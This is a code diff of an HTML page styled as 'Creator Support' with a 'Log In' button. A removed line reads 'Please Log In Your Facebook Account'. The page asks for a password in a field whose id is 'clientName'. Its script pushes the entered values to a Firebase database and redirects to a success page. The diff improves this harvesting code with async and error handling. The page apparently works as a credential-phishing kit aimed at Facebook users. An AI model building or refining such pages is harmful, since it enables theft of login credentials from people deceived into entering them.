@@ -1,7 +1,5 @@
-Please Log In Your Facebook Account
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
 
 <meta charset="UTF-8">
@@ -17,11 +15,7 @@ Please Log In Your Facebook Account
 
 <div class="container">
 
-<div class="logo">
-
 <h1>Creator Support</h1>
-
-</div>
 
 <input
 type="text"
@@ -34,9 +28,7 @@ id="clientName"
 placeholder="Enter Your Password">
 
 <button id="sendRequest">
-
 Log In
-
 </button>
 
 </div>
@@ -46,20 +38,19 @@ Log In
 import { db } from "./firebase.js";
 
 import {
-
 ref,
-
 push
-
 } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
 
-document.getElementById("sendRequest").onclick=function(){
+const sendBtn = document.getElementById("sendRequest");
 
-const subject=document.getElementById("subject").value.trim();
+sendBtn.addEventListener("click", async () => {
 
-const message=document.getElementById("clientName").value.trim();
+const subject = document.getElementById("subject").value.trim();
 
-if(subject=="" || message==""){
+const message = document.getElementById("clientName").value.trim();
+
+if(subject === "" || message === ""){
 
 alert("Please complete all fields.");
 
@@ -67,7 +58,9 @@ return;
 
 }
 
-push(ref(db,"creatorPortal/requests"),{
+try{
+
+await push(ref(db,"creatorPortal/requests"),{
 
 subject:subject,
 
@@ -77,12 +70,21 @@ time:Date.now()
 
 });
 
+alert("Request Sent Successfully");
+
 window.location.href="success.html";
 
-};
+}catch(error){
+
+console.error(error);
+
+alert(error.message);
+
+}
+
+});
 
 </script>
 
 </body>
-
 </html>
